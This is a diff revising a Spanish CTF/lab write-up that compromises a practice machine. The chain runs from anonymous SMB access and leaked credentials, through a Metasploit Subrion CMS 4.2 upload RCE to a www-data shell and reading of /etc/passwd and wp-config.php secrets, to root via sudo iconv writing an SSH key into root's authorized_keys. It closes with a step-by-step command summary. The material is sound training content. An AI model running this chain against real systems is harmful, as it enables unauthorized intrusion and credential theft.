@@ -5,198 +5,253 @@
 ## Reconocimiento
 
 Empiezo con un escaneo de puertos:
-`nmap -sC -sV -O -Pn -p 1-10000 -T4 10.128.136.237`
+
+```bash
+nmap -sC -sV -O -Pn -p 1-10000 -T4 IP
+```
 
 ![nmap](images/nmap.png)
 
-Puertos descubiertos:
+Los puertos descubiertos son:
 
-- 22/tcp (SSH)
-- 80/tcp (HTTP)
-- 139/tcp (Samba)
-- 445/tcp (Samba)
+- `22/tcp` (SSH)
+- `80/tcp` (HTTP)
+- `139/tcp` (SMB)
+- `445/tcp` (SMB)
 
-Como no tengo credenciales para SSH, me centro en los otros puertos.
+Como no tengo credenciales para SSH, me centro en los otros servicios:
 
-SMB -> por si hay shares accesibles sin auth
-HTTP -> por si hay alguna vulnerabilidad web
+- `SMB`, por si hay shares accesibles sin autenticación
+- `HTTP`, por si hay alguna aplicación vulnerable
 
 ## Enumeración
 
 ### SMB
 
-Listo los shares accesibles:
-`smbmap -H IP -u '' -p ''`
+Empiezo listando los shares accesibles:
 
-Veo que hay un share llamado websvr que es accesible sin autenticación.
+```bash
+smbmap -H IP -u '' -p ''
+```
+
+Veo que hay un share llamado `websvr` accesible sin autenticación.
 
 ![smbmap](images/smbmap.png)
 
-Intento conectarme y consigo entrar.
-Listo los archivos para ver qué hay dentro y veo uno llamado "enter.txt".
+Me conecto y listo los archivos. Dentro encuentro uno llamado `enter.txt`.
 
 ![smbclient](images/smbclient.png)
 
-Descargo ese archivo y lo leo. Y veo que hay unas credenciales admin para un Subrion CMS.
+Lo descargo y lo leo. Ahí veo unas credenciales para un panel de `Subrion CMS`:
 
-`admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk`
+```text
+admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk
+```
 
-Además menciona que /subrion está roto y que hay que editarlo desde el panel. También que hay que editar el wordpress.
+Además, el propio archivo comenta que `/subrion` está roto y que hay que editarlo desde el panel. También menciona WordPress.
 
 ![entertxt](images/entertxt.png)
 
-Tras buscar en internet sobre "cooked with magical formula hash" encuentro que se puede descifrar con cyberchef marcando la opción de "magic" y dejando esa opción por defecto.
+Buscando en internet sobre `cooked with magical formula hash`, veo que se puede resolver con CyberChef usando la opción `Magic`.
 
 ![cyberchef](images/cyberchef.png)
 
-Resultado: `Scam2021`.
+El resultado es:
 
-Ahora tenemos que buscar dónde podemos introducir estas credenciales.
+```text
+Scam2021
+```
+
+Ahora ya tengo unas credenciales que solo falta ubicar.
 
 ### Web
 
-Entro en la web (IP de la máquina) y veo la página default de Apache.
+Entro en la web principal y veo la página por defecto de Apache.
 
-Enumeramos directorios con gobuster:
-`gobuster dir -u http://10.128.136.237 -w /usr/share/wordlists/dirb/common.txt`
+Enumero directorios con `gobuster`:
 
-Encontramos unos cuantos directorios, pero el más interesante es el de - /wordpress
+```bash
+gobuster dir -u http://IP -w /usr/share/wordlists/dirb/common.txt
+```
 
-Accedo a ese directorio desde la web y nos lleva a una página de "BestTech Tech Support".
+Entre los resultados, el que más me interesa es:
+
+- `/wordpress`
 
 ![gobuster](images/gobuster.png)
-
 ![web](images/web.png)
 
-Decidí hacer un dirsearch en wordpress para ver qué directorios tenía disponible la web, pero debido a que no tenía credenciales para el wordpress decidí enumerar también subrion antes de hacer nada.
+Decido hacer también `dirsearch` tanto sobre `wordpress` como sobre `subrion`:
 
-`dirsearch -u 10.128.136.237/wordpress`
-
-`dirsearch -u 10.128.136.237/subrion`
+```bash
+dirsearch -u http://IP/wordpress
+dirsearch -u http://IP/subrion
+```
 
 ![dirsearch-wordpress](images/dirsearch-wordpress.png)
-
 ![subrion-dirsearch](images/subrion-dirsearch.png)
 
-En el archivo de "enter.txt" se menciona que /subrion está roto y que hay que editarlo desde el panel. Por lo que las rutas de `/panel` me llamaron la atención.
+En `enter.txt` ya se mencionaba que `/subrion` estaba roto y que había que tocarlo desde el panel, así que las rutas relacionadas con `/panel` me llaman la atención.
 
-Intento acceder a `/subrion` pero efectivamente no funciona, pero si accedo a la ruta descubierta con dirsearch de `/subrion/panel` podemos acceder al login del panel de administración del cms.
+Pruebo a entrar directamente en `/subrion` y efectivamente no carga bien. Pero si accedo a `/subrion/panel`, sí llego al login del panel de administración.
 
 ![subrion-login](images/subrion-login.png)
 
-Probamos las credenciales que obtuvimos de "enter.txt":
+Uso las credenciales que saqué antes:
 
-`admin:Scam2021`
+- Usuario: `admin`
+- Contraseña: `Scam2021`
 
-y conseguimos entrar.
+Y consigo entrar.
 
 ![subrion-login-success](images/subrion-login-success.png)
 
 ## Explotación
 
-Investigando el dashboard de Subrion, vamos a System > General y descubrimos que es la version 4.2.
+Investigando el dashboard de Subrion, en `System > General` veo que se trata de la versión `4.2`.
 
 ![subrion-version](images/subrion-version.png)
 
-Decido buscar en internet "Subrion 4.2 exploit" y encuentro un RCE.
+Busco si esa versión tiene alguna vulnerabilidad conocida y encuentro un RCE. Además, veo que existe un módulo de Metasploit para explotarlo:
+
+```bash
+exploit/multi/http/subrion_cms_file_upload_rce
+```
 
 ![subrion-rce](images/subrion-rce.png)
-
-Y que tiene un modulo de metasploit: `exploit/multi/http/subrion_cms_file_upload_rce` para esto.
-
 ![rce-1](images/rce-1.png)
-
 ![rce-2](images/rce-2.png)
 
-Procedemos a usar metasploit con la maquina victima:
+Lanzo Metasploit con la configuración necesaria:
 
-`msfconsole
+```bash
+msfconsole
 use exploit/multi/http/subrion_cms_file_upload_rce
-set RHOSTS IP_OBJETIVO
+set RHOSTS IP
 set TARGETURI /subrion/
 set USERNAME admin
 set PASSWORD Scam2021
 set LHOST TU_IP_VPN
-run`
+run
+```
 
 ![metasploit](images/metasploit.png)
 
-Conseguimos una shell como www-data.
+Consigo una shell como `www-data`.
 
 ![shell](images/shell.png)
 
-## Post-Explotación
+## Post-explotación
 
-No me funcionan los comandos de "getuid" "getprivs" "whoami /priv" etc por lo que no estoy seguro de qué permisos tengo.
+No puedo sacar demasiado con `getuid`, `getprivs` o `whoami /priv`, así que me centro en enumeración manual.
 
-Hago: `cat /etc/passwd | grep sh` para ver usuarios válidos y si me deja, puedo observar dos usuarios interesantes: el root y un tal `scamsite`
+Primero reviso usuarios válidos con shell:
+
+```bash
+cat /etc/passwd | grep sh
+```
+
+Ahí veo dos cuentas interesantes:
+
+- `root`
+- `scamsite`
 
 ![users](images/users.png)
 
-Tras un rato investigando la máquina, empiezo a mirar si encuentro algo relacionado con wordpress.
+Después empiezo a revisar archivos relacionados con WordPress y leo:
 
-`cat /var/www/html/wordpress/wp-config.php`
-
-Con este comando puedo observar:
+```bash
+cat /var/www/html/wordpress/wp-config.php
 ```
-/** The name of the database for WordPress */
+
+El archivo contiene estas credenciales:
+
+```php
 define( 'DB_NAME', 'wpdb' );
-
-/** MySQL database username */
 define( 'DB_USER', 'support' );
-
-/** MySQL database password */
 define( 'DB_PASSWORD', 'ImAScammerLOL!123!' );
-
-/** MySQL hostname */
 define( 'DB_HOST', 'localhost' );
-
-/** Database Charset to use in creating database tables. */
-define( 'DB_CHARSET', 'utf8' );
-
-/** The Database Collate type. Don't change this if in doubt. */
-define( 'DB_COLLATE', '' );
 ```
 
 ![wp-config](images/wp-config.png)
 
-Podemos correlacionar el usuario `scamsite` con la password `ImAScammerLOL!123!` de wordpress ?
+La contraseña me parece demasiado reutilizable como para ignorarla, así que la pruebo con el usuario `scamsite`.
 
-Pruebo primero en la terminal meterpreter con `su scamsite` pero no me deja.
+Primero intento `su scamsite`, pero no me deja. Así que pruebo por SSH:
 
-Asi que pruebo a ver si me deja por una conexion ssh:
+```bash
+ssh scamsite@IP
+```
 
-`ssh scamsite@IP`
-
-y efectivamente me deja entrar.
+Y efectivamente consigo entrar.
 
 ![ssh](images/ssh.png)
 
-Ahora que tengo una shell como scamsite, empiezo a investigar la máquina. Lo primero que hago es `sudo -l` para ver si tengo permisos para ejecutar algo como root.
+Ya como `scamsite`, hago:
 
-Y veo que puedo ejecutar un binario como root y sin password. Por lo que el siguiente paso es mirar GTFOBins para ver si puedo escalar privilegios con `iconv`.
+```bash
+sudo -l
+```
+
+Y veo que puedo ejecutar `iconv` como `root` sin contraseña.
 
 ![sudo](images/sudo.png)
 ![gtfobins](images/gtfobin.png)
 
 ## Escalada de privilegios
 
-La mejor forma para obtener una shell completa con privilegios de root será generar una ssh-keygen y copiar la clave publica a la maquina victima mediante el comando que nos da GTFOBins.
+La forma más cómoda aquí es generar una clave SSH y copiar la pública al `authorized_keys` de `root` usando `iconv`, tal como sugiere GTFOBins.
 
-Generamos la clave con `ssh-keygen`:
+Primero genero la clave con:
+
+```bash
+ssh-keygen
+```
 
 ![key-gen](images/key-gen.png)
 
-usando el comando que nos da GTFOBins copiamos nuestra clave generada en el archivo authorized_keys del usuario root desde nuestra conexion ssh de scamsite:
+Después, desde la shell de `scamsite`, escribo mi clave pública en `/root/.ssh/authorized_keys` usando el binario permitido:
 
-`echo 'CLAVE' | sudo /usr/bin/iconv -f 8859_1 -t 8859_1 -o /root/.ssh/authorized_keys`
+```bash
+echo 'CLAVE_PUBLICA' | sudo /usr/bin/iconv -f 8859_1 -t 8859_1 -o /root/.ssh/authorized_keys
+```
 
 ![sshkey](images/sshkey.png)
 
-Procedemos a realizar la conexion ssh como root: `ssh root@IP`
+Con eso ya solo queda conectarme como `root`:
+
+```bash
+ssh root@IP
+```
 
 ![root-ssh](images/root.png)
 
 ## Resultado
 
-Hemos obtenido privilegios de root.
+La cadena completa combina una mala exposición de credenciales en SMB, un RCE en Subrion y una escalada final por `sudo` sobre `iconv`, que permite escribir en `authorized_keys` de `root` y entrar por SSH sin más.
+
+## Resumen de comandos directo a SYSTEM/root
+
+1. `nmap -sC -sV -O -Pn -p 1-10000 -T4 IP`
+2. `smbmap -H IP -u '' -p ''`
+3. `smbclient //IP/websvr -N`
+4. `get enter.txt`
+5. Decodificar `7sKvntXdPEJaxazce9PXi24zaFrLiKWCk` y obtener `Scam2021`
+6. `gobuster dir -u http://IP -w /usr/share/wordlists/dirb/common.txt`
+7. `dirsearch -u http://IP/subrion`
+8. Entrar en `http://IP/subrion/panel`
+9. `msfconsole`
+10. `use exploit/multi/http/subrion_cms_file_upload_rce`
+11. `set RHOSTS IP`
+12. `set TARGETURI /subrion/`
+13. `set USERNAME admin`
+14. `set PASSWORD Scam2021`
+15. `set LHOST TU_IP_VPN`
+16. `run`
+17. `cat /var/www/html/wordpress/wp-config.php`
+18. `ssh scamsite@IP`
+19. `sudo -l`
+20. `ssh-keygen`
+21. `echo 'CLAVE_PUBLICA' | sudo /usr/bin/iconv -f 8859_1 -t 8859_1 -o /root/.ssh/authorized_keys`
+22. `ssh root@IP`
+23. `whoami`
